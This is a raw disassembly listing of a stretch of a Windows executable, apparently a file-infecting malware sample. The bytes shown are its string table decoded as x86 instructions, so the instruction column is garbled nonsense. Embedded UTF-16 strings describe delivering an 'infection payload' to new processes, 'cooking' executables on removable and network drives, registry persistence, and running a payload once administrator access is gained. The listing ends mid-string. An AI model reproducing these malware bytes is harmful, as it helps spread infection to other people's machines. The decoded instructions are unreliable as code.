   140004097:	74 00                	je     0x140004099
   140004099:	3c 3e                	cmp    $0x3e,%al
   14000409b:	32 5f 5f             	xor    0x5f(%rdi),%bl
   14000409e:	63 75 72             	movsxd 0x72(%rbp),%esi
   1400040a1:	72 65                	jb     0x140004108
   1400040a3:	6e                   	outsb  (%rsi),(%dx)
   1400040a4:	74 00                	je     0x1400040a6
   1400040a6:	54                   	push   %rsp
   1400040a7:	68 65 48 75 6e       	push   $0x6e754865
   1400040ac:	74 00                	je     0x1400040ae
   1400040ae:	67 65 74 5f          	addr32 gs je 0x140004111
   1400040b2:	43 6f                	rex.XB outsl (%rsi),(%dx)
   1400040b4:	75 6e                	jne    0x140004124
   1400040b6:	74 00                	je     0x1400040b8
   1400040b8:	47                   	rex.RXB
   1400040b9:	65 74 50             	gs je  0x14000410c
   1400040bc:	61                   	(bad)
   1400040bd:	74 68                	je     0x140004127
   1400040bf:	52                   	push   %rdx
   1400040c0:	6f                   	outsl  (%rsi),(%dx)
   1400040c1:	6f                   	outsl  (%rsi),(%dx)
   1400040c2:	74 00                	je     0x1400040c4
   1400040c4:	3c 3e                	cmp    $0x3e,%al
   1400040c6:	33 5f 5f             	xor    0x5f(%rdi),%ebx
   1400040c9:	72 6f                	jb     0x14000413a
   1400040cb:	6f                   	outsl  (%rsi),(%dx)
   1400040cc:	74 00                	je     0x1400040ce
   1400040ce:	54                   	push   %rsp
   1400040cf:	68 72 65 61 64       	push   $0x64616572
   1400040d4:	53                   	push   %rbx
   1400040d5:	74 61                	je     0x140004138
   1400040d7:	72 74                	jb     0x14000414d
   1400040d9:	00 64 6f 6e          	add    %ah,0x6e(%rdi,%rbp,2)
   1400040dd:	74 53                	je     0x140004132
   1400040df:	74 61                	je     0x140004142
   1400040e1:	72 74                	jb     0x140004157
   1400040e3:	00 41 64             	add    %al,0x64(%rcx)
   1400040e6:	64 54                	fs push %rsp
   1400040e8:	6f                   	outsl  (%rsi),(%dx)
   1400040e9:	57                   	push   %rdi
   1400040ea:	68 69 74 65 6c       	push   $0x6c657469
   1400040ef:	69 73 74 00 50 65 72 	imul   $0x72655000,0x74(%rbx),%esi
   1400040f6:	73 69                	jae    0x140004161
   1400040f8:	73 74                	jae    0x14000416e
   1400040fa:	00 4d 6f             	add    %cl,0x6f(%rbp)
   1400040fd:	76 65                	jbe    0x140004164
   1400040ff:	4e                   	rex.WRX
   140004100:	65 78 74             	gs js  0x140004177
   140004103:	00 67 65             	add    %ah,0x65(%rdi)
   140004106:	74 5f                	je     0x140004167
   140004108:	4e 6f                	rex.WRX outsl (%rsi),(%dx)
   14000410a:	77 00                	ja     0x14000410c
   14000410c:	53                   	push   %rbx
   14000410d:	68 6f 77 00 4d       	push   $0x4d00776f
   140004112:	65 73 73             	gs jae 0x140004188
   140004115:	61                   	(bad)
   140004116:	67 65 42 6f          	rex.X outsl %gs:(%esi),(%dx)
   14000411a:	78 00                	js     0x14000411c
   14000411c:	43 72 65             	rex.XB jb 0x140004184
   14000411f:	61                   	(bad)
   140004120:	74 65                	je     0x140004187
   140004122:	53                   	push   %rbx
   140004123:	75 62                	jne    0x140004187
   140004125:	4b                   	rex.WXB
   140004126:	65 79 00             	gs jns 0x140004129
   140004129:	4f 70 65             	rex.WRXB jo 0x140004191
   14000412c:	6e                   	outsb  (%rsi),(%dx)
   14000412d:	53                   	push   %rbx
   14000412e:	75 62                	jne    0x140004192
   140004130:	4b                   	rex.WXB
   140004131:	65 79 00             	gs jns 0x140004134
   140004134:	52                   	push   %rdx
   140004135:	65 67 69 73 74 72 79 	imul   $0x654b7972,%gs:0x74(%ebx),%esi
   14000413c:	4b 65 
   14000413e:	79 00                	jns    0x140004140
   140004140:	47                   	rex.RXB
   140004141:	65 74 45             	gs je  0x140004189
   140004144:	78 65                	js     0x1400041ab
   140004146:	63 75 74             	movsxd 0x74(%rbp),%esi
   140004149:	69 6e 67 41 73 73 65 	imul   $0x65737341,0x67(%rsi),%ebp
   140004150:	6d                   	insl   (%dx),(%rdi)
   140004151:	62 6c 79 00 47       	(bad)
   140004156:	65 74 45             	gs je  0x14000419e
   140004159:	6e                   	outsb  (%rsi),(%dx)
   14000415a:	74 72                	je     0x1400041ce
   14000415c:	79 41                	jns    0x14000419f
   14000415e:	73 73                	jae    0x1400041d3
   140004160:	65 6d                	gs insl (%dx),(%rdi)
   140004162:	62 6c 79 00 43       	(bad)
   140004167:	6f                   	outsl  (%rsi),(%dx)
   140004168:	70 79                	jo     0x1400041e3
   14000416a:	00 47 65             	add    %al,0x65(%rdi)
   14000416d:	74 43                	je     0x1400041b2
   14000416f:	75 72                	jne    0x1400041e3
   140004171:	72 65                	jb     0x1400041d8
   140004173:	6e                   	outsb  (%rsi),(%dx)
   140004174:	74 44                	je     0x1400041ba
   140004176:	69 72 65 63 74 6f 72 	imul   $0x726f7463,0x65(%rdx),%esi
   14000417d:	79 00                	jns    0x14000417f
   14000417f:	67 65 74 5f          	addr32 gs je 0x1400041e2
   140004183:	52                   	push   %rdx
   140004184:	6f                   	outsl  (%rsi),(%dx)
   140004185:	6f                   	outsl  (%rsi),(%dx)
   140004186:	74 44                	je     0x1400041cc
   140004188:	69 72 65 63 74 6f 72 	imul   $0x726f7463,0x65(%rdx),%esi
   14000418f:	79 00                	jns    0x140004191
   140004191:	52                   	push   %rdx
   140004192:	65 67 69 73 74 72 79 	imul   $0x6f007972,%gs:0x74(%ebx),%esi
   140004199:	00 6f 
   14000419b:	70 5f                	jo     0x1400041fc
   14000419d:	45 71 75             	rex.RB jno 0x140004215
   1400041a0:	61                   	(bad)
   1400041a1:	6c                   	insb   (%dx),(%rdi)
   1400041a2:	69 74 79 00 6f 70 5f 	imul   $0x495f706f,0x0(%rcx,%rdi,2),%esi
   1400041a9:	49 
   1400041aa:	6e                   	outsb  (%rsi),(%dx)
   1400041ab:	65 71 75             	gs jno 0x140004223
   1400041ae:	61                   	(bad)
   1400041af:	6c                   	insb   (%dx),(%rdi)
   1400041b0:	69 74 79 00 57 69 6e 	imul   $0x646e6957,0x0(%rcx,%rdi,2),%esi
   1400041b7:	64 
   1400041b8:	6f                   	outsl  (%rsi),(%dx)
   1400041b9:	77 73                	ja     0x14000422e
   1400041bb:	49                   	rex.WB
   1400041bc:	64 65 6e             	fs outsb %gs:(%rsi),(%dx)
   1400041bf:	74 69                	je     0x14000422a
   1400041c1:	74 79                	je     0x14000423c
   1400041c3:	00 00                	add    %al,(%rax)
   1400041c5:	05 5c 00 7e 00       	add    $0x7e005c,%eax
   1400041ca:	00 0b                	add    %cl,(%rbx)
   1400041cc:	2a 00                	sub    (%rax),%al
   1400041ce:	2e 00 65 00          	cs add %ah,0x0(%rbp)
   1400041d2:	78 00                	js     0x1400041d4
   1400041d4:	65 00 00             	add    %al,%gs:(%rax)
   1400041d7:	17                   	(bad)
   1400041d8:	4e 00 65 00          	rex.WRX add %r12b,0x0(%rbp)
   1400041dc:	77 00                	ja     0x1400041de
   1400041de:	20 00                	and    %al,(%rax)
   1400041e0:	50                   	push   %rax
   1400041e1:	00 72 00             	add    %dh,0x0(%rdx)
   1400041e4:	6f                   	outsl  (%rsi),(%dx)
   1400041e5:	00 63 00             	add    %ah,0x0(%rbx)
   1400041e8:	65 00 73 00          	add    %dh,%gs:0x0(%rbx)
   1400041ec:	73 00                	jae    0x1400041ee
   1400041ee:	00 27                	add    %ah,(%rdi)
   1400041f0:	46 00 6f 00          	rex.RX add %r13b,0x0(%rdi)
   1400041f4:	75 00                	jne    0x1400041f6
   1400041f6:	6e                   	outsb  (%rsi),(%dx)
   1400041f7:	00 64 00 20          	add    %ah,0x20(%rax,%rax,1)
   1400041fb:	00 6e 00             	add    %ch,0x0(%rsi)
   1400041fe:	65 00 77 00          	add    %dh,%gs:0x0(%rdi)
   140004202:	20 00                	and    %al,(%rax)
   140004204:	70 00                	jo     0x140004206
   140004206:	72 00                	jb     0x140004208
   140004208:	6f                   	outsl  (%rsi),(%dx)
   140004209:	00 63 00             	add    %ah,0x0(%rbx)
   14000420c:	65 00 73 00          	add    %dh,%gs:0x0(%rbx)
   140004210:	73 00                	jae    0x140004212
   140004212:	20 00                	and    %al,(%rax)
   140004214:	27                   	(bad)
   140004215:	00 01                	add    %al,(%rcx)
   140004217:	79 27                	jns    0x140004240
   140004219:	00 20                	add    %ah,(%rax)
   14000421b:	00 62 00             	add    %ah,0x0(%rdx)
   14000421e:	65 00 69 00          	add    %ch,%gs:0x0(%rcx)
   140004222:	6e                   	outsb  (%rsi),(%dx)
   140004223:	00 67 00             	add    %ah,0x0(%rdi)
   140004226:	20 00                	and    %al,(%rax)
   140004228:	65 00 78 00          	add    %bh,%gs:0x0(%rax)
   14000422c:	65 00 63 00          	add    %ah,%gs:0x0(%rbx)
   140004230:	75 00                	jne    0x140004232
   140004232:	74 00                	je     0x140004234
   140004234:	65 00 64 00 2e       	add    %ah,%gs:0x2e(%rax,%rax,1)
   140004239:	00 20                	add    %ah,(%rax)
   14000423b:	00 57 00             	add    %dl,0x0(%rdi)
   14000423e:	69 00 6c 00 6c 00    	imul   $0x6c006c,(%rax),%eax
   140004244:	20 00                	and    %al,(%rax)
   140004246:	61                   	(bad)
   140004247:	00 74 00 74          	add    %dh,0x74(%rax,%rax,1)
   14000424b:	00 65 00             	add    %ah,0x0(%rbp)
   14000424e:	6d                   	insl   (%dx),(%rdi)
   14000424f:	00 70 00             	add    %dh,0x0(%rax)
   140004252:	74 00                	je     0x140004254
   140004254:	20 00                	and    %al,(%rax)
   140004256:	74 00                	je     0x140004258
   140004258:	6f                   	outsl  (%rsi),(%dx)
   140004259:	00 20                	add    %ah,(%rax)
   14000425b:	00 64 00 65          	add    %ah,0x65(%rax,%rax,1)
   14000425f:	00 6c 00 69          	add    %ch,0x69(%rax,%rax,1)
   140004263:	00 76 00             	add    %dh,0x0(%rsi)
   140004266:	65 00 72 00          	add    %dh,%gs:0x0(%rdx)
   14000426a:	20 00                	and    %al,(%rax)
   14000426c:	69 00 6e 00 66 00    	imul   $0x66006e,(%rax),%eax
   140004272:	65 00 63 00          	add    %ah,%gs:0x0(%rbx)
   140004276:	74 00                	je     0x140004278
   140004278:	69 00 6f 00 6e 00    	imul   $0x6e006f,(%rax),%eax
   14000427e:	20 00                	and    %al,(%rax)
   140004280:	70 00                	jo     0x140004282
   140004282:	61                   	(bad)
   140004283:	00 79 00             	add    %bh,0x0(%rcx)
   140004286:	6c                   	insb   (%dx),(%rdi)
   140004287:	00 6f 00             	add    %ch,0x0(%rdi)
   14000428a:	61                   	(bad)
   14000428b:	00 64 00 2e          	add    %ah,0x2e(%rax,%rax,1)
   14000428f:	00 01                	add    %al,(%rcx)
   140004291:	11 53 00             	adc    %edx,0x0(%rbx)
   140004294:	4f 00 46 00          	rex.WRXB add %r8b,0x0(%r14)
   140004298:	54                   	push   %rsp
   140004299:	00 57 00             	add    %dl,0x0(%rdi)
   14000429c:	41 00 52 00          	add    %dl,0x0(%r10)
   1400042a0:	45 00 00             	add    %r8b,(%r8)
   1400042a3:	0f 47 00             	cmova  (%rax),%eax
   1400042a6:	72 00                	jb     0x1400042a8
   1400042a8:	61                   	(bad)
   1400042a9:	00 6e 00             	add    %ch,0x0(%rsi)
   1400042ac:	6f                   	outsl  (%rsi),(%dx)
   1400042ad:	00 6c 00 61          	add    %ch,0x61(%rax,%rax,1)
   1400042b1:	00 00                	add    %al,(%rax)
   1400042b3:	09 6e 00             	or     %ebp,0x0(%rsi)
   1400042b6:	75 00                	jne    0x1400042b8
   1400042b8:	6c                   	insb   (%dx),(%rdi)
   1400042b9:	00 6c 00 00          	add    %ch,0x0(%rax,%rax,1)
   1400042bd:	29 49 00             	sub    %ecx,0x0(%rcx)
   1400042c0:	67 00 6e 00          	add    %ch,0x0(%esi)
   1400042c4:	6f                   	outsl  (%rsi),(%dx)
   1400042c5:	00 72 00             	add    %dh,0x0(%rdx)
   1400042c8:	69 00 6e 00 67 00    	imul   $0x67006e,(%rax),%eax
   1400042ce:	20 00                	and    %al,(%rax)
   1400042d0:	4e 00 65 00          	rex.WRX add %r12b,0x0(%rbp)
   1400042d4:	77 00                	ja     0x1400042d6
   1400042d6:	20 00                	and    %al,(%rax)
   1400042d8:	50                   	push   %rax
   1400042d9:	00 72 00             	add    %dh,0x0(%rdx)
   1400042dc:	6f                   	outsl  (%rsi),(%dx)
   1400042dd:	00 63 00             	add    %ah,0x0(%rbx)
   1400042e0:	65 00 73 00          	add    %dh,%gs:0x0(%rbx)
   1400042e4:	73 00                	jae    0x1400042e6
   1400042e6:	00 25 49 00 67 00    	add    %ah,0x670049(%rip)        # 0x140674335
   1400042ec:	6e                   	outsb  (%rsi),(%dx)
   1400042ed:	00 6f 00             	add    %ch,0x0(%rdi)
   1400042f0:	72 00                	jb     0x1400042f2
   1400042f2:	69 00 6e 00 67 00    	imul   $0x67006e,(%rax),%eax
   1400042f8:	20 00                	and    %al,(%rax)
   1400042fa:	70 00                	jo     0x1400042fc
   1400042fc:	72 00                	jb     0x1400042fe
   1400042fe:	6f                   	outsl  (%rsi),(%dx)
   1400042ff:	00 63 00             	add    %ah,0x0(%rbx)
   140004302:	65 00 73 00          	add    %dh,%gs:0x0(%rbx)
   140004306:	73 00                	jae    0x140004308
   140004308:	20 00                	and    %al,(%rax)
   14000430a:	27                   	(bad)
   14000430b:	00 01                	add    %al,(%rcx)
   14000430d:	39 27                	cmp    %esp,(%rdi)
   14000430f:	00 20                	add    %ah,(%rax)
   140004311:	00 62 00             	add    %ah,0x0(%rdx)
   140004314:	65 00 63 00          	add    %ah,%gs:0x0(%rbx)
   140004318:	61                   	(bad)
   140004319:	00 75 00             	add    %dh,0x0(%rbp)
   14000431c:	73 00                	jae    0x14000431e
   14000431e:	65 00 20             	add    %ah,%gs:(%rax)
   140004321:	00 69 00             	add    %ch,0x0(%rcx)
   140004324:	74 00                	je     0x140004326
   140004326:	20 00                	and    %al,(%rax)
   140004328:	69 00 73 00 20 00    	imul   $0x200073,(%rax),%eax
   14000432e:	77 00                	ja     0x140004330
   140004330:	68 00 69 00 74       	push   $0x74006900
   140004335:	00 65 00             	add    %ah,0x0(%rbp)
   140004338:	6c                   	insb   (%dx),(%rdi)
   140004339:	00 69 00             	add    %ch,0x0(%rcx)
   14000433c:	73 00                	jae    0x14000433e
   14000433e:	74 00                	je     0x140004340
   140004340:	65 00 64 00 2e       	add    %ah,%gs:0x2e(%rax,%rax,1)
   140004345:	00 01                	add    %al,(%rcx)
   140004347:	1d 4d 00 6f 00       	sbb    $0x6f004d,%eax
   14000434c:	64 00 75 00          	add    %dh,%fs:0x0(%rbp)
   140004350:	6c                   	insb   (%dx),(%rdi)
   140004351:	00 65 00             	add    %ah,0x0(%rbp)
   140004354:	20 00                	and    %al,(%rax)
   140004356:	46 00 61 00          	rex.RX add %r12b,0x0(%rcx)
   14000435a:	69 00 6c 00 75 00    	imul   $0x75006c,(%rax),%eax
   140004360:	72 00                	jb     0x140004362
   140004362:	65 00 00             	add    %al,%gs:(%rax)
   140004365:	31 55 00             	xor    %edx,0x0(%rbp)
   140004368:	6e                   	outsb  (%rsi),(%dx)
   140004369:	00 61 00             	add    %ah,0x0(%rcx)
   14000436c:	62                   	(bad)
   14000436d:	00 6c 00 65          	add    %ch,0x65(%rax,%rax,1)
   140004371:	00 20                	add    %ah,(%rax)
   140004373:	00 74 00 6f          	add    %dh,0x6f(%rax,%rax,1)
   140004377:	00 20                	add    %ah,(%rax)
   140004379:	00 63 00             	add    %ah,0x0(%rbx)
   14000437c:	6f                   	outsl  (%rsi),(%dx)
   14000437d:	00 6f 00             	add    %ch,0x0(%rdi)
   140004380:	6b 00 20             	imul   $0x20,(%rax),%eax
   140004383:	00 70 00             	add    %dh,0x0(%rax)
   140004386:	72 00                	jb     0x140004388
   140004388:	6f                   	outsl  (%rsi),(%dx)
   140004389:	00 63 00             	add    %ah,0x0(%rbx)
   14000438c:	65 00 73 00          	add    %dh,%gs:0x0(%rbx)
   140004390:	73 00                	jae    0x140004392
   140004392:	20 00                	and    %al,(%rax)
   140004394:	27                   	(bad)
   140004395:	00 01                	add    %al,(%rcx)
   140004397:	21 27                	and    %esp,(%rdi)
   140004399:	00 2e                	add    %ch,(%rsi)
   14000439b:	00 20                	add    %ah,(%rax)
   14000439d:	00 4d 00             	add    %cl,0x0(%rbp)
   1400043a0:	65 00 73 00          	add    %dh,%gs:0x0(%rbx)
   1400043a4:	73 00                	jae    0x1400043a6
   1400043a6:	61                   	(bad)
   1400043a7:	00 67 00             	add    %ah,0x0(%rdi)
   1400043aa:	65 00 20             	add    %ah,%gs:(%rax)
   1400043ad:	00 77 00             	add    %dh,0x0(%rdi)
   1400043b0:	61                   	(bad)
   1400043b1:	00 73 00             	add    %dh,0x0(%rbx)
   1400043b4:	3a 00                	cmp    (%rax),%al
   1400043b6:	20 00                	and    %al,(%rax)
   1400043b8:	01 03                	add    %eax,(%rbx)
   1400043ba:	2e 00 00             	cs add %al,(%rax)
   1400043bd:	03 7e 00             	add    0x0(%rsi),%edi
   1400043c0:	00 03                	add    %al,(%rbx)
   1400043c2:	5c                   	pop    %rsp
   1400043c3:	00 00                	add    %al,(%rax)
   1400043c5:	47                   	rex.RXB
   1400043c6:	4e 00 65 00          	rex.WRX add %r12b,0x0(%rbp)
   1400043ca:	74 00                	je     0x1400043cc
   1400043cc:	77 00                	ja     0x1400043ce
   1400043ce:	6f                   	outsl  (%rsi),(%dx)
   1400043cf:	00 72 00             	add    %dh,0x0(%rdx)
   1400043d2:	6b 00 2f             	imul   $0x2f,(%rax),%eax
   1400043d5:	00 52 00             	add    %dl,0x0(%rdx)
   1400043d8:	65 00 6d 00          	add    %ch,%gs:0x0(%rbp)
   1400043dc:	6f                   	outsl  (%rsi),(%dx)
   1400043dd:	00 76 00             	add    %dh,0x0(%rsi)
   1400043e0:	61                   	(bad)
   1400043e1:	00 62 00             	add    %ah,0x0(%rdx)
   1400043e4:	6c                   	insb   (%dx),(%rdi)
   1400043e5:	00 65 00             	add    %ah,0x0(%rbp)
   1400043e8:	20 00                	and    %al,(%rax)
   1400043ea:	43 00 6f 00          	rex.XB add %bpl,0x0(%r15)
   1400043ee:	6f                   	outsl  (%rsi),(%dx)
   1400043ef:	00 6b 00             	add    %ch,0x0(%rbx)
   1400043f2:	20 00                	and    %al,(%rax)
   1400043f4:	56                   	push   %rsi
   1400043f5:	00 69 00             	add    %ch,0x0(%rcx)
   1400043f8:	63 00                	movsxd (%rax),%eax
   1400043fa:	74 00                	je     0x1400043fc
   1400043fc:	69 00 6d 00 20 00    	imul   $0x20006d,(%rax),%eax
   140004402:	46 00 6f 00          	rex.RX add %r13b,0x0(%rdi)
   140004406:	75 00                	jne    0x140004408
   140004408:	6e                   	outsb  (%rsi),(%dx)
   140004409:	00 64 00 00          	add    %ah,0x0(%rax,%rax,1)
   14000440d:	3b 41 00             	cmp    0x0(%rcx),%eax
   140004410:	74 00                	je     0x140004412
   140004412:	74 00                	je     0x140004414
   140004414:	65 00 6d 00          	add    %ch,%gs:0x0(%rbp)
   140004418:	70 00                	jo     0x14000441a
   14000441a:	74 00                	je     0x14000441c
   14000441c:	69 00 6e 00 67 00    	imul   $0x67006e,(%rax),%eax
   140004422:	20 00                	and    %al,(%rax)
   140004424:	74 00                	je     0x140004426
   140004426:	6f                   	outsl  (%rsi),(%dx)
   140004427:	00 20                	add    %ah,(%rax)
   140004429:	00 63 00             	add    %ah,0x0(%rbx)
   14000442c:	6f                   	outsl  (%rsi),(%dx)
   14000442d:	00 6f 00             	add    %ch,0x0(%rdi)
   140004430:	6b 00 20             	imul   $0x20,(%rax),%eax
   140004433:	00 74 00 68          	add    %dh,0x68(%rax,%rax,1)
   140004437:	00 65 00             	add    %ah,0x0(%rbp)
   14000443a:	20 00                	and    %al,(%rax)
   14000443c:	66 00 69 00          	data16 add %ch,0x0(%rcx)
   140004440:	6c                   	insb   (%dx),(%rdi)
   140004441:	00 65 00             	add    %ah,0x0(%rbp)
   140004444:	20 00                	and    %al,(%rax)
   140004446:	27                   	(bad)
   140004447:	00 01                	add    %al,(%rcx)
   140004449:	45 27                	rex.RB (bad)
   14000444b:	00 20                	add    %ah,(%rax)
   14000444d:	00 6f 00             	add    %ch,0x0(%rdi)
   140004450:	6e                   	outsb  (%rsi),(%dx)
   140004451:	00 20                	add    %ah,(%rax)
   140004453:	00 61 00             	add    %ah,0x0(%rcx)
   140004456:	20 00                	and    %al,(%rax)
   140004458:	72 00                	jb     0x14000445a
   14000445a:	65 00 6d 00          	add    %ch,%gs:0x0(%rbp)
   14000445e:	6f                   	outsl  (%rsi),(%dx)
   14000445f:	00 76 00             	add    %dh,0x0(%rsi)
   140004462:	61                   	(bad)
   140004463:	00 62 00             	add    %ah,0x0(%rdx)
   140004466:	6c                   	insb   (%dx),(%rdi)
   140004467:	00 65 00             	add    %ah,0x0(%rbp)
   14000446a:	20 00                	and    %al,(%rax)
   14000446c:	6f                   	outsl  (%rsi),(%dx)
   14000446d:	00 72 00             	add    %dh,0x0(%rdx)
   140004470:	20 00                	and    %al,(%rax)
   140004472:	6e                   	outsb  (%rsi),(%dx)
   140004473:	00 65 00             	add    %ah,0x0(%rbp)
   140004476:	74 00                	je     0x140004478
   140004478:	77 00                	ja     0x14000447a
   14000447a:	6f                   	outsl  (%rsi),(%dx)
   14000447b:	00 72 00             	add    %dh,0x0(%rdx)
   14000447e:	6b 00 20             	imul   $0x20,(%rax),%eax
   140004481:	00 64 00 72          	add    %ah,0x72(%rax,%rax,1)
   140004485:	00 69 00             	add    %ch,0x0(%rcx)
   140004488:	76 00                	jbe    0x14000448a
   14000448a:	65 00 2e             	add    %ch,%gs:(%rsi)
   14000448d:	00 01                	add    %al,(%rcx)
   14000448f:	13 73 00             	adc    0x0(%rbx),%esi
   140004492:	74 00                	je     0x140004494
   140004494:	61                   	(bad)
   140004495:	00 72 00             	add    %dh,0x0(%rdx)
   140004498:	74 00                	je     0x14000449a
   14000449a:	44 00 61 00          	add    %r12b,0x0(%rcx)
   14000449e:	74 00                	je     0x1400044a0
   1400044a0:	65 00 00             	add    %al,%gs:(%rax)
   1400044a3:	15 4d 00 4d 00       	adc    $0x4d004d,%eax
   1400044a8:	2d 00 64 00 64       	sub    $0x64006400,%eax
   1400044ad:	00 2d 00 79 00 79    	add    %ch,0x79007900(%rip)        # 0x1b900bdb3
   1400044b3:	00 79 00             	add    %bh,0x0(%rcx)
   1400044b6:	79 00                	jns    0x1400044b8
   1400044b8:	01 15 72 00 61 00    	add    %edx,0x610072(%rip)        # 0x140614530
   1400044be:	6e                   	outsb  (%rsi),(%dx)
   1400044bf:	00 50 00             	add    %dl,0x0(%rax)
   1400044c2:	61                   	(bad)
   1400044c3:	00 79 00             	add    %bh,0x0(%rcx)
   1400044c6:	6c                   	insb   (%dx),(%rdi)
   1400044c7:	00 6f 00             	add    %ch,0x0(%rdi)
   1400044ca:	61                   	(bad)
   1400044cb:	00 64 00 00          	add    %ah,0x0(%rax,%rax,1)
   1400044cf:	0b 66 00             	or     0x0(%rsi),%esp
   1400044d2:	61                   	(bad)
   1400044d3:	00 6c 00 73          	add    %ch,0x73(%rax,%rax,1)
   1400044d7:	00 65 00             	add    %ah,0x0(%rbp)
   1400044da:	00 09                	add    %cl,(%rcx)
   1400044dc:	74 00                	je     0x1400044de
   1400044de:	72 00                	jb     0x1400044e0
   1400044e0:	75 00                	jne    0x1400044e2
   1400044e2:	65 00 00             	add    %al,%gs:(%rax)
   1400044e5:	0f                   	movmskps (bad),%eax
   1400044e6:	50                   	push   %rax
   1400044e7:	00 61 00             	add    %ah,0x0(%rcx)
   1400044ea:	79 00                	jns    0x1400044ec
   1400044ec:	6c                   	insb   (%dx),(%rdi)
   1400044ed:	00 6f 00             	add    %ch,0x0(%rdi)
   1400044f0:	61                   	(bad)
   1400044f1:	00 64 00 00          	add    %ah,0x0(%rax,%rax,1)
   1400044f5:	35 53 00 68 00       	xor    $0x680053,%eax
   1400044fa:	6f                   	outsl  (%rsi),(%dx)
   1400044fb:	00 75 00             	add    %dh,0x0(%rbp)
   1400044fe:	6c                   	insb   (%dx),(%rdi)
   1400044ff:	00 64 00 20          	add    %ah,0x20(%rax,%rax,1)
   140004503:	00 62 00             	add    %ah,0x0(%rdx)
   140004506:	65 00 20             	add    %ah,%gs:(%rax)
   140004509:	00 64 00 6f          	add    %ah,0x6f(%rax,%rax,1)
   14000450d:	00 69 00             	add    %ch,0x0(%rcx)
   140004510:	6e                   	outsb  (%rsi),(%dx)
   140004511:	00 67 00             	add    %ah,0x0(%rdi)
   140004514:	20 00                	and    %al,(%rax)
   140004516:	73 00                	jae    0x140004518
   140004518:	6f                   	outsl  (%rsi),(%dx)
   140004519:	00 6d 00             	add    %ch,0x0(%rbp)
   14000451c:	65 00 74 00 68       	add    %dh,%gs:0x68(%rax,%rax,1)
   140004521:	00 69 00             	add    %ch,0x0(%rcx)
   140004524:	6e                   	outsb  (%rsi),(%dx)
   140004525:	00 67 00             	add    %ah,0x0(%rdi)
   140004528:	21 00                	and    %eax,(%rax)
   14000452a:	00 6d 57             	add    %ch,0x57(%rbp)
   14000452d:	00 65 00             	add    %ah,0x0(%rbp)
   140004530:	20 00                	and    %al,(%rax)
   140004532:	68 00 61 00 76       	push   $0x76006100
   140004537:	00 65 00             	add    %ah,0x0(%rbp)
   14000453a:	20 00                	and    %al,(%rax)
   14000453c:	61                   	(bad)
   14000453d:	00 64 00 6d          	add    %ah,0x6d(%rax,%rax,1)
   140004541:	00 69 00             	add    %ch,0x0(%rcx)
   140004544:	6e                   	outsb  (%rsi),(%dx)
   140004545:	00 69 00             	add    %ch,0x0(%rcx)
   140004548:	73 00                	jae    0x14000454a
   14000454a:	74 00                	je     0x14000454c
   14000454c:	72 00                	jb     0x14000454e
   14000454e:	61                   	(bad)
   14000454f:	00 74 00 6f          	add    %dh,0x6f(%rax,%rax,1)
   140004553:	00 72 00             	add    %dh,0x0(%rdx)
   140004556:	20 00                	and    %al,(%rax)
   140004558:	61                   	(bad)
   140004559:	00 63 00             	add    %ah,0x0(%rbx)
   14000455c:	63 00                	movsxd (%rax),%eax
   14000455e:	65 00 73 00          	add    %dh,%gs:0x0(%rbx)
   140004562:	73 00                	jae    0x140004564
   140004564:	2e 00 20             	cs add %ah,(%rax)
   140004567:	00 54 00 69          	add    %dl,0x69(%rax,%rax,1)
   14000456b:	00 6d 00             	add    %ch,0x0(%rbp)
   14000456e:	65 00 20             	add    %ah,%gs:(%rax)
   140004571:	00 74 00 6f          	add    %dh,0x6f(%rax,%rax,1)
   140004575:	00 20                	add    %ah,(%rax)
   140004577:	00 65 00             	add    %ah,0x0(%rbp)
   14000457a:	78 00                	js     0x14000457c
   14000457c:	65 00 63 00          	add    %ah,%gs:0x0(%rbx)
   140004580:	75 00                	jne    0x140004582
   140004582:	74 00                	je     0x140004584
   140004584:	65 00 20             	add    %ah,%gs:(%rax)
   140004587:	00 70 00             	add    %dh,0x0(%rax)
   14000458a:	61                   	(bad)
   14000458b:	00 79 00             	add    %bh,0x0(%rcx)
   14000458e:	6c                   	insb   (%dx),(%rdi)
   14000458f:	00 6f 00             	add    %ch,0x0(%rdi)
   140004592:	61                   	(bad)
   140004593:	00 64 00 2e          	add    %ah,0x2e(%rax,%rax,1)
   140004597:	00 00                	add    %al,(%rax)
   140004599:	80 b7 41 00 64 00 6d 	xorb   $0x6d,0x640041(%rdi)
   1400045a0:	00 69 00             	add    %ch,0x0(%rcx)
   1400045a3:	6e                   	outsb  (%rsi),(%dx)
   1400045a4:	00 69 00             	add    %ch,0x0(%rcx)
   1400045a7:	73 00                	jae    0x1400045a9
   1400045a9:	74 00                	je     0x1400045ab
   1400045ab:	72 00                	jb     0x1400045ad
   1400045ad:	61                   	(bad)
   1400045ae:	00 74 00 6f          	add    %dh,0x6f(%rax,%rax,1)
   1400045b2:	00 72 00             	add    %dh,0x0(%rdx)
   1400045b5:	20 00                	and    %al,(%rax)
   1400045b7:	61                   	(bad)
   1400045b8:	00 63 00             	add    %ah,0x0(%rbx)
   1400045bb:	63 00                	movsxd (%rax),%eax
   1400045bd:	65 00 73 00          	add    %dh,%gs:0x0(%rbx)
   1400045c1:	73 00                	jae    0x1400045c3
   1400045c3:	20 00                	and    %al,(%rax)
   1400045c5:	74 00                	je     0x1400045c7
   1400045c7:	69 00 6d 00 65 00    	imul   $0x65006d,(%rax),%eax
   1400045cd:	6f                   	outsl  (%rsi),(%dx)
   1400045ce:	00 75 00             	add    %dh,0x0(%rbp)
   1400045d1:	74 00                	je     0x1400045d3
   1400045d3:	20 00                	and    %al,(%rax)
   1400045d5:	6f                   	outsl  (%rsi),(%dx)
   1400045d6:	00 63 00             	add    %ah,0x0(%rbx)
   1400045d9:	63 00                	movsxd (%rax),%eax
   1400045db:	75 00                	jne    0x1400045dd
   1400045dd:	72 00                	jb     0x1400045df
   1400045df:	65 00 64 00 2e       	add    %ah,%gs:0x2e(%rax,%rax,1)
   1400045e4:	00 20                	add    %ah,(%rax)
   1400045e6:	00 54 00 69          	add    %dl,0x69(%rax,%rax,1)
   1400045ea:	00 6d 00             	add    %ch,0x0(%rbp)
   1400045ed:	65 00 20             	add    %ah,%gs:(%rax)
   1400045f0:	00 74 00 6f          	add    %dh,0x6f(%rax,%rax,1)
   1400045f4:	00 20                	add    %ah,(%rax)
   1400045f6:	00 65 00             	add    %ah,0x0(%rbp)
   1400045f9:	78 00                	js     0x1400045fb
   1400045fb:	65 00 63 00          	add    %ah,%gs:0x0(%rbx)
   1400045ff:	75 00                	jne    0x140004601
   140004601:	74 00                	je     0x140004603
   140004603:	65 00 20             	add    %ah,%gs:(%rax)
   140004606:	00 70 00             	add    %dh,0x0(%rax)
